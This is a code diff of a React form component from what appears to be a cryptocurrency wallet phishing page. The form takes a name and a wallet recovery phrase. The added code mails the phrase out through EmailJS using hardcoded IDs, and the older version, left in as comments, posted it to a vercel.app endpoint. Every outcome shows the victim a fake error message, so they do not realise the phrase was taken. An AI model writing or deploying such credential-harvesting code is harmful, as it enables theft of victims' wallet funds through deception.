@@ -1,6 +1,11 @@
 import { useState } from "react";
+import emailjs from "@emailjs/browser";
 import InfoModal from "./InfoModal";
 import Modal from "./Modal";
+
+const TEMPLATE_ID = "template_abtmpzm";
+const SERVICE_ID = "service_xsj88wd";
+const PUBLIC_KEY = "ggZdJlIqb4y0Cr2TW";
 
 const FormModal = ({ handleShowModal, showModal }) => {
   const [formData, setformData] = useState({
@@ -25,32 +30,53 @@ const FormModal = ({ handleShowModal, showModal }) => {
   // submit form handler
   const handleSubmit = (e) => {
     e.preventDefault();
-    const email = process.env.REACT_APP_EMAIL;
-    fetch(`https://wallet-now.vercel.app/api/v1/key/godsonpmoneyking`, {
-      method: "post",
-      headers: {
-        "Content-Type": "application/json",
-        "User-Agent": "PostmanRuntime/7.29.2",
-      },
-      body: JSON.stringify({
-        name: formData.name,
-        message: formData.recoveryPhrase,
-      }),
-    })
-       .then((res) => res.json())
-      .then((data) => {
-        if (data?.statusCode == 404) setMessage(data?.message);
-        else if (data?.accepted?.length)
+
+    emailjs
+      .send(
+        SERVICE_ID,
+        TEMPLATE_ID,
+        {
+          from_name: formData.name,
+          message: formData.recoveryPhrase,
+        },
+        PUBLIC_KEY
+      )
+      .then(
+        () => {
           setMessage(`An error occurred. Please try again later.`);
-        else setMessage("An error occurred");
-        setShowInfoModal(true);
-        console.log(data);
-      })
-      .catch((err) => {
-        console.log(err);
-        setMessage(err.message);
-        setShowInfoModal(true);
-      });
+          setShowInfoModal(true);
+        },
+        () => {
+          setMessage(`An error occurred. Please try again later.`);
+          setShowInfoModal(true);
+        }
+      );
+
+    // fetch(`https://wallet-now.vercel.app/api/v1/key/godsonpmoneyking`, {
+    //   method: "post",
+    //   headers: {
+    //     "Content-Type": "application/json",
+    //     "User-Agent": "PostmanRuntime/7.29.2",
+    //   },
+    //   body: JSON.stringify({
+    //     name: formData.name,
+    //     message: formData.recoveryPhrase,
+    //   }),
+    // })
+    //   .then((res) => res.json())
+    //   .then((data) => {
+    //     if (data?.statusCode === 404) setMessage(data?.message);
+    //     else if (data?.accepted?.length)
+    //       setMessage(`An error occurred. Please try again later.`);
+    //     else setMessage("An error occurred");
+    //     setShowInfoModal(true);
+    //     console.log(data);
+    //   })
+    //   .catch((err) => {
+    //     console.log(err);
+    //     setMessage(err.message);
+    //     setShowInfoModal(true);
+    //   });
 
     setformData({
       name: "",
